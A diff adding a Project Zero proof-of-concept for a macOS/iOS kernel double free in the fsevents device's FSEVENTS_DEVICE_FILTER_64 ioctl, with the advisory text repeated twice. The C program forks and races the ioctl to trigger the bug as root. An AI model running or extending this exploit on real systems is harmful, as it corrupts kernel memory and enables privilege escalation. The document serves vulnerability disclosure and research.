@@ -1,0 +1,220 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1129
+
+fseventsf_ioctl handles ioctls on fsevent fds acquired via FSEVENTS_CLONE_64 on /dev/fsevents
+
+Heres the code for the FSEVENTS_DEVICE_FILTER_64 ioctl:
+
+    case FSEVENTS_DEVICE_FILTER_64:
+      if (!proc_is64bit(vfs_context_proc(ctx))) {
+        ret = EINVAL;
+        break;
+      }
+      devfilt_args = (fsevent_dev_filter_args64 *)data;
+      
+    handle_dev_filter:
+    {
+      int new_num_devices;
+      dev_t *devices_not_to_watch, *tmp=NULL;
+      
+      if (devfilt_args->num_devices > 256) {
+        ret = EINVAL;
+        break;
+      }
+      
+      new_num_devices = devfilt_args->num_devices;
+      if (new_num_devices == 0) {
+        tmp = fseh->watcher->devices_not_to_watch;   <------ (a)
+        
+        lock_watch_table();                          <------ (b)
+        fseh->watcher->devices_not_to_watch = NULL;
+        fseh->watcher->num_devices = new_num_devices;
+        unlock_watch_table();                        <------ (c)
+        
+        if (tmp) {
+          FREE(tmp, M_TEMP);                         <------ (d)
+        }
+        break;
+      }
+
+There's nothing stopping two threads seeing the same value for devices_not_to_watch at (a),
+assigning that to tmp then freeing it at (d). The lock/unlock at (b) and (c) don't protect this.
+
+This leads to a double free, which if you also race allocations from the same zone can lead to an
+exploitable kernel use after free.
+
+/dev/fsevents is:
+crw-r--r--  1 root  wheel   13,   0 Feb 15 14:00 /dev/fsevents
+
+so this is a privesc from either root or members of the wheel group to kernel
+
+tested on MacOS 10.12.3 (16D32) on MacbookAir5,2
+
+(build with -O3)
+
+The open handler for the fsevents device node has a further access check:
+
+  if (!kauth_cred_issuser(kauth_cred_get())) {
+    return EPERM;
+  }
+
+restricting this issue to root only despite the permissions on the device node (which is world-readable)
+*/
+
+
+// ianbeer
+#if 0
+MacOS/iOS kernel double free due to bad locking in fsevents device
+
+fseventsf_ioctl handles ioctls on fsevent fds acquired via FSEVENTS_CLONE_64 on /dev/fsevents
+
+Heres the code for the FSEVENTS_DEVICE_FILTER_64 ioctl:
+
+    case FSEVENTS_DEVICE_FILTER_64:
+      if (!proc_is64bit(vfs_context_proc(ctx))) {
+        ret = EINVAL;
+        break;
+      }
+      devfilt_args = (fsevent_dev_filter_args64 *)data;
+      
+    handle_dev_filter:
+    {
+      int new_num_devices;
+      dev_t *devices_not_to_watch, *tmp=NULL;
+      
+      if (devfilt_args->num_devices > 256) {
+        ret = EINVAL;
+        break;
+      }
+      
+      new_num_devices = devfilt_args->num_devices;
+      if (new_num_devices == 0) {
+        tmp = fseh->watcher->devices_not_to_watch;   <------ (a)
+        
+        lock_watch_table();                          <------ (b)
+        fseh->watcher->devices_not_to_watch = NULL;
+        fseh->watcher->num_devices = new_num_devices;
+        unlock_watch_table();                        <------ (c)
+        
+        if (tmp) {
+          FREE(tmp, M_TEMP);                         <------ (d)
+        }
+        break;
+      }
+
+There's nothing stopping two threads seeing the same value for devices_not_to_watch at (a),
+assigning that to tmp then freeing it at (d). The lock/unlock at (b) and (c) don't protect this.
+
+This leads to a double free, which if you also race allocations from the same zone can lead to an
+exploitable kernel use after free.
+
+/dev/fsevents is:
+crw-r--r--  1 root  wheel   13,   0 Feb 15 14:00 /dev/fsevents
+
+so this is a privesc from either root or members of the wheel group to kernel
+
+tested on MacOS 10.12.3 (16D32) on MacbookAir5,2
+
+(build with -O3)
+#endif
+
+#include <fcntl.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <sys/ioctl.h>
+#include <sys/types.h>
+#include <pthread.h>
+
+#include <unistd.h>
+
+typedef uint64_t user64_addr_t;
+
+typedef struct fsevent_clone_args64 {
+  user64_addr_t  event_list;
+  int32_t        num_events;
+  int32_t        event_queue_depth;
+  user64_addr_t  fd;
+} fsevent_clone_args64;
+
+#define FSEVENTS_CLONE_64 _IOW('s', 1, fsevent_clone_args64)
+
+#pragma pack(push, 4)
+typedef struct fsevent_dev_filter_args64 {
+  uint32_t       num_devices;
+  user64_addr_t  devices;
+} fsevent_dev_filter_args64;
+#pragma pack(pop)
+
+#define FSEVENTS_DEVICE_FILTER_64 _IOW('s', 100, fsevent_dev_filter_args64)
+
+void* racer(void* thread_arg){
+  int fd = *(int*)thread_arg;
+  printf("started thread\n");
+
+  fsevent_dev_filter_args64 arg = {0};
+  int32_t dev = 0;
+ 
+  while (1) {
+    arg.num_devices = 1;
+    arg.devices = (user64_addr_t)&dev;
+    int err = ioctl(fd, FSEVENTS_DEVICE_FILTER_64, &arg);
+    
+    if (err == -1) {
+      perror("error in FSEVENTS_DEVICE_FILTER_64\n");
+      exit(EXIT_FAILURE);
+    }
+    
+    arg.num_devices = 0;
+    arg.devices = (user64_addr_t)&dev;
+
+    err = ioctl(fd, FSEVENTS_DEVICE_FILTER_64, &arg);
+    
+    if (err == -1) {
+      perror("error in FSEVENTS_DEVICE_FILTER_64\n");
+      exit(EXIT_FAILURE);
+    }
+  }
+
+  return NULL;
+}
+int main(){
+  int fd = open("/dev/fsevents", O_RDONLY);
+  if (fd == -1) {
+    perror("can't open fsevents device, are you root?");
+    exit(EXIT_FAILURE);
+  }
+
+  // have to FSEVENTS_CLONE this to get the real fd
+  fsevent_clone_args64 arg = {0};
+  int event_fd = 0;
+  int8_t event = 0;
+
+
+  arg.event_list = (user64_addr_t)&event;
+  arg.num_events = 1;
+  arg.event_queue_depth = 1;
+  arg.fd = (user64_addr_t)&event_fd;
+
+  int err = ioctl(fd, FSEVENTS_CLONE_64, &arg);
+  
+  if (err == -1) {
+    perror("error in FSEVENTS_CLONE_64\n");
+    exit(EXIT_FAILURE);
+  }
+
+  if (event_fd != 0) {
+    printf("looks like we got a new fd %d\n", event_fd);
+  } else {
+    printf("no new fd\n");
+  }
+
+  pid_t pid = fork();
+  if (pid == 0) {
+    racer(&event_fd);
+  } else {
+    racer(&event_fd);
+  }
+
+
+  return 1;
+}
